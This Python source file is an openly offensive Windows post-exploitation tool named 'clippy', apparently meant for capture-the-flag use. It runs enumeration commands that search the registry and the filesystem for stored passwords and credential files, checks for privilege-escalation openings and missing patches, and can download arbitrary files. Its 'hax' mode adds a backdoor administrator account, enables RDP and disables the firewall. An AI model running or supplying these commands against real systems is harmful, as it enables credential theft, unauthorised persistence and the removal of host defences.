import subprocess,urllib.request,random,sys,datetime,re,os
from pathlib import Path

report = ""

def print_banner(title):
	banner = "==============================\n" + title + "\n==============================\n"
	global report
	report += banner
	print(banner)

def system_call(command):
	process = subprocess.Popen(command,stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
	(stdout, stderr) = process.communicate()
	stdout = stdout.decode("utf-8")
	print(stdout)
	global report
	report += "\n" + stdout
	return stdout

def list_dir(path):
	dir_string = ""
	if path.exists():
		for currentFile in path.iterdir():  
			dir_string += str(currentFile) + "\n"
	print(dir_string)
	global report
	report += "\n" + dir_string

def determine_os_ver(): # STUB
	#ver_string.splitlines()[1]
	return "Not yet Implemented"

def kb_search(kbs):
	print_banner("OS Ver Possible Exploits (Not yet implemented)")
	os = determine_os_ver()
	vulns = [ 
		["MS04-019",["2000 SP3","2000 SP4"],"KB842526"],
		["MS04-011",["2000 SP2","2000 SP3","2000 SP4","XP","XP SP1"],"KB835732"],
		["MS04-020",["2000 SP4"],"KB841872"],
		["MS05-018",["2000 SP3","2000 SP4","XP SP1","XP SP2"],"KB890859"],
		["MS05-055",["2000 SP4"],"KB908523"],
		["MS06-030",["2000 SP1","2000 SP2","2000 SP3","2000 SP4","XP SP2"],"KB914389"],
		["MS06-049",["2000 SP4"],"KB920958"],
		["MS08-025",["2000 SP4","XP SP2","2003 SP1","2003 SP2","2008","Vista","Vista SP1"],"KB920958"],
		["MS10-015",["2000","2000 SP1", "2000 SP2","2000 SP3","2000 SP4","XP", "XP SP1","XP SP2","XP SP3","2003", "2003 SP1","2003 SP2","2003 SP3","2008","2008 SP1","2008 SP2","Vista","Vista SP1","Vista SP2","7","7 SP1"],"KB977165"],
		["MS10-021",["2000 SP4","XP SP2","XP SP3","2003 SP2","2008 SP2","Vista","Vista SP1","Vista SP2","7"],"KB979683"],
		["MS10-059",["2008","2008 SP1","2008 SP2","Vista","Vista SP1","Vista SP2","7"],"KB982799"],
		["MS10-073",["XP SP2","XP SP3","2003 SP2","2008 SP2","Vista SP1","Vista SP2","7"],"KB981957"],
		["MS10-092",["2008","2008 SP1","2008 SP2","Vista SP1","Vista SP2","7"],"KB2305420"],
		["MS11-011",["XP SP2","XP SP3","2003 SP2","2008 SP2","Vista SP1","Vista SP2","7"],"KB2393802"],
		["MS11-046",["XP SP3","2003 SP2","2008 SP1","2008 SP2","Vista SP1","Vista SP2","7 SP1"],"KB2503665"],
		["MS11-062",["XP","XP SP1","XP SP2","XP SP3","2003","2003 SP1","2003 SP2"],"KB2566454"],
		["MS11-080",["XP SP2","XP SP3","2003 SP2"],"KB2592799"],
		["MS13-005",["Vista SP2","2008 SP2","7","7 SP1","8","2012"],"KB2778930"],
		["MS14-002",["XP SP3","2003 SP2"],"KB2914368"],
		["MS14-040",["2003 SP2","2008 SP2","Vista SP2","7 SP1"],"KB2975684"],
		["MS14-070",["2003 SP2"],"KB2989935"],
		["MS15-051",["2003 SP2","2008 SP2","Vista SP2","7 SP1"],"KB3057191"],
		["MS15-076",["2003 SP2","Vista SP2","2008 SP2","7","7 SP1", "8","8.1","2012"],"KB3067505"],
		["MS16-016",["2008 SP1","2008 SP2","Vista SP2","7 SP1"],"KB3136041"],
		["MS16-032",["2008 SP1","2008 SP2","Vista SP2","7 SP1"],"KB3143141"],
		["MS17-017",["2008 SP2","Vista SP2","7 SP1"],"KB4013081"]]
		#["MS14-058",[],"KB3000061"], #["MS15-010",["XP","2003","2008","7"],"KB3036220"],#["MS15-061",["2003","2008","7","2012","8"],"KB3057839"],#["MS15-075",["2003","2008","7","2012","8"],"KB3164038"],## ["MS16-051",["2003","2008","7","8","2012"],"KB3057191"],
	compat = []
	for vuln in vulns:
		if os in vuln[1] and vuln[2] not in kbs:
			compat.append(vuln)
	for vuln in compat:
		print(vuln[0])

def save_report():
	text_file = open("clippy_report_" + str(datetime.datetime.now()).replace(":","_").replace(" ","_").replace(".","_") + ".txt", "w")
	text_file.write(report)
	text_file.close()

def greeting():
	greetings = ["escalate privileges","hack the planet"]
	greeting = "I see you're trying to " + random.choice(greetings) + ", would you like some help with that?"
	print("""\
	< {0} >
		     __
		    /  \
		    |  |
		    @  @
		    |  |
		    || |/
		    || ||
		    |\_/|
		    \___/
	                    """.format(greeting)) #Source https://textart.io/cowsay/clippy

def usage():
	print("Usage: clippy.exe\nclippy.exe enum            - Performs  enumeration\nclippy.exe enum report     - Performs enumeration and saves report to disk\nclippy.exe download [url]  - Downloads a file from given URL \nclippy.exe hax             - Creates new admin, enables RDP, disables firewall (CTF Orientated)")

def enum():
	print_banner("BASIC OS INFO")
	system_call('ver')
	system_call('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"')
	system_call('hostname')
	system_call('net config Workstation')

	print_banner("PATH")
	system_call('echo %path%')

	print_banner("USERS")
	system_call("echo %username%")
	system_call('net users')

	print_banner("GROUPS")
	system_call('net localgroup')

	print_banner("ADMIN USERS")
	system_call("net localgroup Administrators")

	print_banner("REGISTRY: Always Installed Elevated")
	system_call('reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated')
	system_call('reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated')

	print_banner("REGISTRY: Credentials Search")
	system_call('reg query HKLM /f password /t REG_SZ /s')
	system_call('reg query HKCU /f password /t REG_SZ /s')

	print_banner("TASKS")
	system_call('tasklist /v')

	print_banner("SCHEDULED TASKS")

	system_call('schtasks /query /fo LIST /v')

	print_banner("NETWORKING: Listening Ports")
	system_call("netstat -ano")

	print_banner("FIREWALL: Status")
	system_call("netsh firewall show state")

	print_banner("FIREWALL: Config")
	system_call("netsh firewall show config")

	print_banner("DRIVERS")
	system_call("DRIVERQUERY")

	print_banner("FILESYSTEM: Credentials Search")
	system_call("dir /s *pass* == *cred* == *vnc* == *.config*")
	# system_call("findstr /si password *.xml *.ini *.txt *.config")
	system_call("dir /b /s unattend.xml")
	system_call("dir /b /s web.config")
	system_call("dir /b /s sysprep.inf")
	system_call("dir /b /s sysprep.xml")
	system_call("dir /b /s vnc.ini")

	print_banner("PROGRAMS: Installed Programs")
	list_dir(Path(r'C:\Program Files'))
	list_dir(Path(r'C:\Program Files (x86)'))

	print_banner("PROGRAMS: Appdata")
	list_dir(Path(os.getenv('APPDATA')))
	list_dir(Path(os.getenv('LOCALAPPDATA')))

	print_banner("WMIC: Installed Patches")
	kb_search(re.findall (r'\b[KB]\w+', system_call("wmic qfe get Caption,Description,HotFixID,InstalledOn")))

	print_banner("WMIC: Unquoted Service Paths")
	system_call('wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """"')

	print_banner("ACCESSCHK")
	if Path("accesschk.exe").exists():
		system_call('accesschk.exe -uwcqv "Authenticated Users" * /accepteula')
	else:
		print("accesschk.exe missing.")

def download(url):
	file = urllib.request.urlopen(url)
	with open(url[url.rindex('/')+1:],'wb') as output:
  		output.write(file.read())

def obvious_hax():
	print_banner("Creating a new admin user")
	system_call("net user hax hax /add")
	system_call("net localgroup administrators hax /add")
	system_call('net localgroup "Remote Desktop Users" hax /add')
	print_banner("Enabling RDP")
	system_call('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f')
	system_call('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
	system_call('net start TermService')
	print_banner("Disabling Firewall")
	system_call('NetSh Advfirewall set allprofiles state off')
	system_call('netsh firewall set opmode disable')

greeting()
if len(sys.argv) > 1:
	if "enum" in sys.argv:
		enum()
		if "report" in sys.argv:
			save_report()
	elif "hax" in sys.argv:
		obvious_hax()
	elif "download" in sys.argv and len(sys.argv) > 2:
		download(sys.argv[2])
	else: 
		usage()
else:
		usage()